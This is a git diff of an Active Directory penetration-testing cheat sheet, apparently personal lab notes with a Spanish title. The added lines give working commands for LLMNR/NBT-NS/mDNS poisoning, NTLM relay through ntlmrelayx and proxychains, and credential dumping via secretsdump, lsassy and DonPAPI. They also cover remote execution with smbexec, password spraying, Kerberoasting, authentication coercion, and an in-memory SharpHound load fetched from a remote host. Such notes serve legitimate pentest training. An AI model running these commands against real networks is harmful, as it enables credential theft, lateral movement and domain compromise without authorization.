@@ -1,6 +1,7 @@
 # Enumeracion de Active Directory
 
 Inspired by [Orange Cyberdefense](https://orange-cyberdefense.github.io/ocd-mindmaps/):
+and [Mayfly](https://mayfly277.github.io/categories/ad/)
 
 ![Mindmap Pentest AD](image-1.png)
 
@@ -37,21 +38,71 @@ https://github.com/urbanadventurer/username-anarchy
 kerbrute userenum -d alux.cc usernames.txt
 ```
 
-## Poisoning
+## Poisoning and Relay
 
-### Linux
+### Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD
+
+#### Linux
+
+[mitm6](https://github.com/dirkjanm/mitm6)
+[Responder](https://github.com/lgandx/Responder)
 
 ```bash
 sudo responder -I tun0
+mitm6 
 ```
-
-
-### Windows
+#### Windows
 
 https://github.com/Kevin-Robertson/Inveigh
 
-```cmd
+```powershell
 .\Inveigh.exe
+```
+
+### Relay Attacks
+
+>Note that the relayed authentication must be from a user which has Local Admin access to the relayed host and SMB signing must be disabled.
+
+#### Enumerate Unsigned SMB
+
+> signing:False
+
+```bash
+crackmapexec smb scope.txt --gen-relay-list relay.txt
+```
+
+Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.
+
+```bash
+sed -i 's/HTTP = On/HTTP = Off/g' /etc/Responder/Responder.conf && cat /etc/Responder/Responder.conf | grep --color=never 'HTTP ='
+sed -i 's/SMB = On/SMB = Off/g' /etc/Responder/Responder.conf && cat /etc/Responder/Responder.conf | grep --color=never 'SMB ='
+#Revert process
+sed -i 's/HTTP = Off/HTTP = On/g' /etc/Responder/Responder.conf && cat /etc/Responder.conf | grep --color=never 'HTTP ='
+sed -i 's/SMB = Off/SMB = On/g' /etc/Responder/Responder.conf && cat /etc/Responder/Responder.conf | grep --color=never 'SMB ='
+```
+
+Start ntlmrelay
+
+- `-tf` : list of targets to relay the authentication
+- `-of` : output file, this will keep the captured smb hashes just like we did before with responder, to crack them later
+- `-smb2support` : support for smb2
+- `-socks` : will start a socks proxy to use relayed authentication
+
+```bash
+#Install proxychains
+sudo apt install proxychains
+#Configure /etc/proxychains.conf and add this line
+socks4  127.0.0.1 1080
+# Start attack
+sudo python3 ntlmrelayx.py -tf relay.txt -of netntlm -smb2support -socks
+# User obtained
+# [*] SMBD-Thread-97: Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left!
+proxychains python3 secretsdump.py -no-pass 'DOMAIN'/'USER'@'IP'
+proxychains lsassy --no-pass -d DOMAIN -u userobtained $ip
+proxychains DonPAPI -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -credz creds_robb.txt
+proxychains crackmapexec smb $ip -d DOMAINnotdotcom -u username -p password --sam #password could be anything
+proxychains python3 smbclient.py -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -debug
+proxychains python3 smbexec.py -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -debug
 ```
 
 ## Valid Username
@@ -62,6 +113,7 @@ https://github.com/Kevin-Robertson/Inveigh
 crackmapexec smb -u usernames.txt -p Password123!
 kerbrute passwordspray --user-as-pass --dc $ip -d alux.cc users.txt
 use auxiliary/scanner/smb/smb_login
+crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce
 ```
 
 ### ASREPRoast
@@ -111,6 +163,10 @@ and import this to [bloodhound ly4k version](https://github.com/ly4k/BloodHound)
 
 ```powershell
 .\sharphound.exe -c All -d domain.com
+## Memory Execution
+$data = (New-Object System.Net.WebClient).DownloadData('http://ip/SharpHound.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Sharphound.Program]::Main("-d domain.com -c all".Split())
 ```
 
 ### Kerberoasting
@@ -118,6 +174,7 @@ and import this to [bloodhound ly4k version](https://github.com/ly4k/BloodHound)
 ```bash
 GetUserSPNs.py -request -dc-ip <DCIP> domain.com/username -outputfile hashes.kerberoast
 GetUserSPNs.py -request -dc-ip <DCIP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
+crackmapexec ldap $ip -u username -p 'password' -d domain.com --kerberoasting KERBEROASTING
 ```
 
 ### ADCS
@@ -158,3 +215,4 @@ python3 PetitPotam.py -u 'username' -p 'password' -d 'domain.com' listenerIP tar
 #Automatically coerce a Windows server to authenticate on an arbitrary machine through many methods
 python3 Coercer.py coerce -u 'username' -p 'password' -d 'domain.com' -t targetIP -l listenerIP --always-continue
 ```
+
